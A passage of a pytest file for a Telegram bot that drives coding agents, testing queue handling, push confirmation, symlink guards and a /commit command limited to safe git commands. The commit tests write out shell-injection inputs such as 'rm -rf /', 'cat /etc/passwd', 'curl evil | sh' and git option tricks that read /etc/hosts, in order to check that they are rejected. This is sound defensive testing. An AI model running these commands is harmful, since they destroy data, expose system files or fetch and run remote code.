    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="second question"), SimpleNamespace(args=[], bot=bot))
        await router.handle_abort(make_update(text="/abort"), SimpleNamespace(args=[], bot=bot))
        await first_task

        assert len(runner.resume_calls) == 1
        assert any("aborted" in message.lower() for _, message, _, _ in bot.messages)
        prompt_messages = [entry for entry in bot.messages if "Do you want to continue processing the pending queued questions?" in entry[1]]
        assert len(prompt_messages) == 1
        keyboard = prompt_messages[0][3]
        assert keyboard is not None
        buttons = keyboard.inline_keyboard[0]
        assert buttons[0].callback_data == "queuecontinue:yes"
        assert buttons[1].callback_data == "queuecontinue:no"

    asyncio.run(exercise())


def test_aborted_run_without_pending_queue_does_not_prompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = AbortableBlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_abort(make_update(text="/abort"), SimpleNamespace(args=[], bot=bot))
        await first_task

        assert len(runner.resume_calls) == 1
        assert any("aborted" in message.lower() for _, message, _, _ in bot.messages)
        assert not any(
            "Do you want to continue processing the pending queued questions?" in message
            for _, message, _, _ in bot.messages
        )

    asyncio.run(exercise())


def test_aborted_run_yes_callback_continues_pending_queue(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = AbortableBlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="second question"), SimpleNamespace(args=[], bot=bot))
        await router.handle_abort(make_update(text="/abort"), SimpleNamespace(args=[], bot=bot))
        await first_task

        edited = []
        answers = []
        update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(
                data="queuecontinue:yes",
                answer=None,
                edit_message_text=None,
            ),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        update.callback_query.answer = fake_answer
        update.callback_query.edit_message_text = fake_edit

        callback_task = asyncio.create_task(router.handle_queue_continue_callback(update, SimpleNamespace(args=[], bot=bot)))
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await callback_task

        assert answers == ["answered"]
        assert edited == ["Continuing with the pending queued questions."]
        assert len(runner.resume_calls) == 2
        assert runner.resume_calls[1]["user_message"] == "second question"
        assert any("Working on queued questions:" in message for _, message, _, _ in bot.messages)

    asyncio.run(exercise())


def test_aborted_run_no_callback_discards_pending_queue(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = AbortableBlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="second question"), SimpleNamespace(args=[], bot=bot))
        await router.handle_abort(make_update(text="/abort"), SimpleNamespace(args=[], bot=bot))
        await first_task

        edited = []
        answers = []
        update = SimpleNamespace(
            effective_chat=SimpleNamespace(id=123, type="private"),
            callback_query=SimpleNamespace(
                data="queuecontinue:no",
                answer=None,
                edit_message_text=None,
            ),
        )

        async def fake_answer():
            answers.append("answered")

        async def fake_edit(text):
            edited.append(text)

        update.callback_query.answer = fake_answer
        update.callback_query.edit_message_text = fake_edit

        await router.handle_queue_continue_callback(update, SimpleNamespace(args=[], bot=bot))

        assert answers == ["answered"]
        assert edited == ["Pending queued questions were discarded."]
        assert len(runner.resume_calls) == 1
        assert not router._chat_message_queue_files.get(123)
        assert router._chat_processing_queue_files.get(123) is None

    asyncio.run(exercise())


def test_completed_run_with_pending_queue_starts_next_file_without_prompt(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = BlockingRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_queue", "queue-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    async def exercise():
        bot = FakeBot()
        first_task = asyncio.create_task(router.handle_message(make_update(text="first question"), SimpleNamespace(args=[], bot=bot)))
        started = await asyncio.to_thread(runner.wait_started, 1, 1.0)
        assert started is True

        await router.handle_message(make_update(text="second question"), SimpleNamespace(args=[], bot=bot))
        runner.release_next()
        started_second = await asyncio.to_thread(runner.wait_started, 2, 1.0)
        assert started_second is True
        runner.release_next()
        await first_task

        assert len(runner.resume_calls) == 2
        assert not any(
            "Do you want to continue processing the pending queued questions?" in message
            for _, message, _, _ in bot.messages
        )

    asyncio.run(exercise())


def test_assistant_output_is_chunked_by_rendered_html_length(tmp_path: Path):
    backend = tmp_path / "backend"
    backend.mkdir()
    runner = LongEscapedMarkdownRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "max_telegram_message_length": 160})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_html", "html-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=False)

    update = make_update(text="show long html")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert all(len(message[1]) <= cfg.max_telegram_message_length for message in bot.messages[1:])


def test_unsupported_message_type_is_rejected(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text=None, photo=None, video=object()),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_unsupported_message(update, context))

    assert "This bot currently accepts only text messages and photos." in bot.messages[-1][1]


def _make_commit_router(tmp_path: Path, *, git_manager=None, trusted: bool = True) -> tuple[CommandRouter, Path]:
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": True})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_commit", "commit-session", "backend", "codex")
    if trusted:
        store.trust_project("backend")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = git_manager or FakeGitManager(is_git_repo=True)
    router.runtime.git = router.git
    return router, backend


def _run_commit_command(router: CommandRouter, raw: str) -> FakeBot:
    update = make_update(text=raw)
    bot = FakeBot()
    context = SimpleNamespace(args=raw.split()[1:], bot=bot)
    asyncio.run(router.handle_commit(update, context))
    return bot


def _run_push_command(router: CommandRouter) -> FakeBot:
    update = make_update(text="/push")
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_push(update, context))
    return bot


def test_commit_executes_only_valid_git_commands_and_ignores_non_git_segments(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git add completed."),
                SimpleNamespace(success=True, message="git commit completed.", stdout="[telegram-enhance 5b9a263] safe"),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git add -u && rm -rf / && git commit -m "safe"')

    assert router.git.safe_git_commands == [
        (backend, ["add", "-u"]),
        (backend, ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
    ]
    assert router.git.git_commands == []
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign'])}"
    ) in bot.messages[-1][1]
    assert "---------------" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "[telegram-enhance 5b9a263] safe" in bot.messages[-1][1]
    assert "Ignored non-git commands:" in bot.messages[-1][1]
    assert "- rm -rf /" in bot.messages[-1][1]


def test_commit_is_rejected_when_disabled(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_commit", "commit-session", "backend", "codex")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)

    bot = _run_commit_command(router, "/commit git status")

    assert "/commit is disabled." in bot.messages[-1][1]
    assert router.git.safe_git_commands == []


def test_commit_rejects_git_global_option_prefix(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, '/commit git -c alias.x=!echo hacked commit -m "x"')

    assert router.git.safe_git_commands == []
    assert "No valid git commit commands were found." in bot.messages[-1][1]


def test_commit_ignores_multiple_shell_injection_patterns(tmp_path: Path):
    cases = [
        ('/commit git status; python exploit.py; git add -u', ("python exploit.py",)),
        ('/commit git status&&rm -rf /&&git add -u', ("rm -rf /",)),
        ('/commit git status | cat /etc/passwd | git add -u', ("cat /etc/passwd",)),
        ('/commit git status & curl evil | sh & git add -u', ("curl evil", "sh")),
        ('/commit git status > /tmp/out && git add -u', ("/tmp/out",)),
        ('/commit git status >> /tmp/out && git add -u', ("/tmp/out",)),
        ('/commit git status < /tmp/in && git add -u', ("/tmp/in",)),
        ('/commit git status\nrm -rf /\ngit add -u', ("rm -rf /",)),
        ('/commit git status; $(touch /tmp/pwned); git add -u', ("$(touch /tmp/pwned)",)),
        ('/commit git status && `whoami` && git add -u', ("`whoami`",)),
        ('/commit git status && env VAR=1 python exploit.py && git add -u', ("env VAR=1 python exploit.py",)),
        ('/commit python exploit.py && git status && git add -u', ("python exploit.py",)),
    ]
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git add completed."),
            ]
            * len(cases),
        ),
    )

    for raw, ignored_fragments in cases:
        bot = _run_commit_command(router, raw)

        assert router.git.safe_git_commands[-2:] == [
            (backend, ["status"]),
            (backend, ["add", "-u"]),
        ]
        for fragment in ignored_fragments:
            assert fragment in bot.messages[-1][1]
        assert "Ignored non-git commands:" in bot.messages[-1][1]


def test_commit_rejects_malformed_or_prefixed_non_git_commands(tmp_path: Path):
    cases = [
        '/commit "unterminated',
        '/commit env VAR=1 git status',
        '/commit git status git commit -m "oops"',
        '/commit git status git diff -- README.md',
        '/commit git status git push origin main',
        '/commit git add --pathspec-from-file /etc/hosts',
        '/commit git add --pathspec-from-file=/etc/hosts',
        '/commit git add --pathspec-from-f=/etc/hosts',
        '/commit git commit -F /etc/hosts',
        '/commit git commit -F/etc/hosts',
        '/commit git commit --file=/etc/hosts',
        '/commit git commit --allow-empty --fil=/etc/hosts',
        '/commit git commit --templ=/etc/hosts',
        '/commit git diff -- README.md',
        '/commit git diff --no-index /etc/passwd /dev/null',
    ]
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    for raw in cases:
        bot = _run_commit_command(router, raw)

        assert router.git.safe_git_commands == []
        assert "No valid git commit commands were found." in bot.messages[-1][1]


def test_commit_allows_adjacent_valid_git_commands_without_spaces(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git add completed."),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git status&&git add -u')

    assert router.git.safe_git_commands == [
        (backend, ["status"]),
        (backend, ["add", "-u"]),
    ]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'status'])}" in bot.messages[-1][1]
    assert f"${shlex.join(['git', 'add', '-u'])}" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "Ignored non-git commands:" not in bot.messages[-1][1]


def test_commit_allows_common_safe_short_forms(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git status completed."),
                SimpleNamespace(success=True, message="git commit completed."),
            ],
        ),
    )

    bot = _run_commit_command(router, '/commit git status -sb&&git commit -msafe')

    assert router.git.safe_git_commands == [
        (backend, ["status", "-sb"]),
        (backend, ["commit", "-msafe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
    ]
    assert f"${shlex.join(['git', 'status', '-sb'])}" in bot.messages[-1][1]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-msafe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_allows_shell_style_backslash_newline_continuations(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[
                SimpleNamespace(success=True, message="git add completed."),
                SimpleNamespace(success=True, message="git commit completed."),
            ],
        ),
    )

    raw = '/commit git add \\\n  src/app.py \\\n  tests/test_app.py && git commit -m "safe"'
    bot = _run_commit_command(router, raw)

    assert router.git.safe_git_commands == [
        (backend, ["add", "src/app.py", "tests/test_app.py"]),
        (backend, ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign"]),
    ]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_inserts_enforced_flags_before_pathspec_separator(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git commit -m "safe" -- tracked.txt')

    assert router.git.safe_git_commands == [
        (
            backend,
            ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign", "--", "tracked.txt"],
        ),
    ]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign', '--', 'tracked.txt'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_inserts_enforced_flags_before_implicit_pathspec(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git commit completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git commit -m "safe" tracked.txt')

    assert router.git.safe_git_commands == [
        (
            backend,
            ["commit", "-m", "safe", "--no-verify", "--no-post-rewrite", "--no-gpg-sign", "tracked.txt"],
        ),
    ]
    assert html.escape(
        f"${shlex.join(['git', 'commit', '-m', 'safe', '--no-verify', '--no-post-rewrite', '--no-gpg-sign', 'tracked.txt'])}"
    ) in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_commit_allows_shell_like_text_inside_quoted_pathspec(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git add completed.")],
        ),
    )

    bot = _run_commit_command(router, '/commit git add "file && keep | chars > literally.txt"')

    assert router.git.safe_git_commands == [
        (backend, ["add", "file && keep | chars > literally.txt"]),
    ]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert html.escape(f"${shlex.join(['git', 'add', 'file && keep | chars > literally.txt'])}") in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]
    assert "Ignored non-git commands:" not in bot.messages[-1][1]


def test_commit_reports_missing_project_folder_before_git_calls(tmp_path: Path):
    router, backend = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))
    backend.rmdir()

    bot = _run_commit_command(router, "/commit git status")

    assert router.git.safe_git_commands == []
    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]


def test_commit_rejects_parent_path_escape(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git add ../secret.txt")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_absolute_paths(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git commit -m safe -- /etc/passwd")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_pathspec_magic(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    bot = _run_commit_command(router, "/commit git status -- :(top)README.md")

    assert router.git.safe_git_commands == []
    assert "Unsafe path arguments are not allowed." in bot.messages[-1][1]


def test_commit_rejects_mutating_git_commands_for_untrusted_project(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True), trusted=False)

    bot = _run_commit_command(router, "/commit git add -u && git commit -m safe")

    assert router.git.safe_git_commands == []
    assert "This project is not trusted for mutating git operations." in bot.messages[-1][1]


def test_commit_allows_status_for_untrusted_project(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=True, message="git status completed.")],
        ),
        trusted=False,
    )

    bot = _run_commit_command(router, "/commit git status")

    assert router.git.safe_git_commands == [
        (backend, ["status"]),
    ]
    assert "[Completed]" in bot.messages[-1][1]


def test_push_uses_current_session_branch(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": True})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-1",
        push_result=SimpleNamespace(success=True, message="Pushed branch 'feature-1' to origin.", current_branch="feature-1"),
    )
    router.runtime.git = router.git

    bot = _run_push_command(router)

    assert router.git.push_calls == []
    assert bot.messages[-1][1] == "Push branch `feature-1` to `origin`?"
    assert bot.messages[-1][2] == "Markdown"
    assert bot.messages[-1][3] is not None


def test_push_confirmation_executes_push(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": False})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(
        is_git_repo=True,
        current_branch="feature-1",
        push_result=SimpleNamespace(success=True, message="Pushed branch 'feature-1' to origin.", current_branch="feature-1"),
    )
    router.runtime.git = router.git
    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:confirm",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text, parse_mode=None):
        edited.append((text, parse_mode))

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert edited == [("Pushing branch `feature-1` to `origin`...", "Markdown")]
    assert router.git.push_calls == [(backend, "feature-1")]
    assert bot.messages[-1][1].startswith('<pre><code class="language-bash">')
    assert f"${shlex.join(['git', 'push', 'origin', 'feature-1'])}" in bot.messages[-1][1]
    assert "[Completed]" in bot.messages[-1][1]


def test_push_confirmation_cancel_does_not_push(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-1")
    router.runtime.git = router.git
    edited = []
    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        callback_query=SimpleNamespace(
            data="push:cancel",
            answer=None,
            edit_message_text=None,
        ),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    async def fake_answer():
        return None

    async def fake_edit(text):
        edited.append(text)

    update.callback_query.answer = fake_answer
    update.callback_query.edit_message_text = fake_edit

    asyncio.run(router.handle_push_callback(update, context))

    assert edited == ["Push cancelled."]
    assert router.git.push_calls == []


def test_push_reports_missing_project_folder_before_git_calls(tmp_path: Path):
    backend = (tmp_path / "backend").resolve()
    backend.mkdir()
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    cfg = AppConfig(**{**cfg.__dict__, "enable_commit_command": True})
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    store.create_session("bot-a", 123, "sess_push", "push-session", "backend", "codex", branch_name="feature-1")
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True, current_branch="feature-1")
    router.runtime.git = router.git
    backend.rmdir()

    bot = _run_push_command(router)

    assert router.git.push_calls == []
    assert "Project folder no longer exists for this session: backend" in bot.messages[-1][1]


# ---------------------------------------------------------------------------
# _path_within_project — symlink traversal guard
# ---------------------------------------------------------------------------


def test_path_within_project_allows_normal_files(tmp_path: Path):
    from coding_agent_telegram.router.base import CommandRouterBase

    project = tmp_path / "project"
    project.mkdir()
    (project / "src").mkdir()
    (project / "src" / "file.py").write_text("x")

    assert CommandRouterBase._path_within_project(project, "src/file.py")
    assert CommandRouterBase._path_within_project(project, "README.md")


def test_path_within_project_blocks_symlink_escape(tmp_path: Path):
    """A symlink inside the project pointing outside must be rejected."""
    from coding_agent_telegram.router.base import CommandRouterBase

    project = tmp_path / "project"
    project.mkdir()
    outside = tmp_path / "outside"
    outside.mkdir()
    (outside / "secret.txt").write_text("secret")

    # Create a symlink inside the project that points outside
    link = project / "external_link"
    link.symlink_to(outside)

    assert not CommandRouterBase._path_within_project(project, "external_link/secret.txt")


def test_path_within_project_blocks_symlink_to_file_outside(tmp_path: Path):
    """A symlink to a single file outside the project must also be rejected."""
    from coding_agent_telegram.router.base import CommandRouterBase

    project = tmp_path / "project"
    project.mkdir()
    secret = tmp_path / "secret.txt"
    secret.write_text("secret")

    link = project / "linked_secret.txt"
    link.symlink_to(secret)

    assert not CommandRouterBase._path_within_project(project, "linked_secret.txt")


# ---------------------------------------------------------------------------
# Workspace lock — concurrent agent runs on the same project are blocked
# ---------------------------------------------------------------------------


def test_workspace_lock_blocks_second_call_on_same_project(tmp_path: Path):
    """When a workspace lock is held, a second _run_with_typing call on the same
    project must be rejected immediately with an 'already running' message."""
    from coding_agent_telegram.agent_runner import MultiAgentRunner

    runner_real = MultiAgentRunner(
        codex_bin="codex",
        copilot_bin="copilot",
        approval_policy="never",
        sandbox_mode="workspace-write",
    )
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner_real, bot_id="bot-a"))

    messages_sent: list = []

    async def run():
        # Manually hold the workspace lock to simulate an in-flight agent run.
        lock = router._workspace_locks.setdefault("myproject", asyncio.Lock())
        async with lock:
            bot = FakeBot()
            update = make_update()
            context = SimpleNamespace(args=[], bot=bot)
            result = await router._run_with_typing(
                update,
                context,
                runner_real.resume_session,
                "codex",
                "sess_1",
                tmp_path,
                "hello",
                workspace_lock_key="myproject",
            )
            assert result is None
            messages_sent.extend(bot.messages)

    asyncio.run(run())
    assert any("already running" in msg[1] for msg in messages_sent)


def test_workspace_lock_allows_different_projects_concurrently(tmp_path: Path):
    """Two calls with different workspace_lock_keys must not block each other."""
    from coding_agent_telegram.agent_runner import MultiAgentRunner

    runner_real = MultiAgentRunner(
        codex_bin="codex",
        copilot_bin="copilot",
        approval_policy="never",
        sandbox_mode="workspace-write",
    )
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner_real, bot_id="bot-a"))

    async def run():
        # Hold the lock for "project-a"
        lock_a = router._workspace_locks.setdefault("project-a", asyncio.Lock())
        async with lock_a:
            # "project-b" lock should be free — lock.locked() returns False
            lock_b = router._workspace_locks.setdefault("project-b", asyncio.Lock())
            assert not lock_b.locked()

    asyncio.run(run())


# ---------------------------------------------------------------------------
# message_commands — null message guards (lines 15, 31)
# ---------------------------------------------------------------------------


def test_handle_message_does_nothing_when_message_is_none(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert bot.messages == []


def test_handle_message_does_nothing_when_text_is_empty(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text="", photo=None, caption=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_message(update, context))

    assert bot.messages == []


def test_handle_photo_does_nothing_when_message_is_none(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=None,
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)

    asyncio.run(router.handle_photo(update, context))

    assert bot.messages == []


# ---------------------------------------------------------------------------
# git_commands — commit disabled, empty args, git command fails
# ---------------------------------------------------------------------------


def test_commit_sends_disabled_message_when_not_enabled(tmp_path: Path):
    runner = DummyRunner()
    cfg = make_config(tmp_path)
    # enable_commit_command defaults to False in make_config
    store = SessionStore(cfg.state_file, cfg.state_backup_file)
    router = CommandRouter(RouterDeps(cfg=cfg, store=store, agent_runner=runner, bot_id="bot-a"))
    router.git = FakeGitManager(is_git_repo=True)
    router.runtime.git = router.git

    update = make_update(text="/commit git add .")
    bot = FakeBot()
    context = SimpleNamespace(args=["git", "add", "."], bot=bot)
    asyncio.run(router.handle_commit(update, context))

    assert "disabled" in bot.messages[-1][1].lower()


def test_commit_sends_usage_when_no_text_after_command(tmp_path: Path):
    router, _ = _make_commit_router(tmp_path, git_manager=FakeGitManager(is_git_repo=True))

    update = SimpleNamespace(
        effective_chat=SimpleNamespace(id=123, type="private"),
        message=SimpleNamespace(text="/commit", photo=None, caption=None),
    )
    bot = FakeBot()
    context = SimpleNamespace(args=[], bot=bot)
    asyncio.run(router.handle_commit(update, context))

    assert "Usage" in bot.messages[-1][1]


def test_commit_reports_failed_git_command_and_stops(tmp_path: Path):
    router, backend = _make_commit_router(
        tmp_path,
        git_manager=FakeGitManager(
            is_git_repo=True,
            git_command_results=[SimpleNamespace(success=False, message="nothing to commit")],
        ),
    )

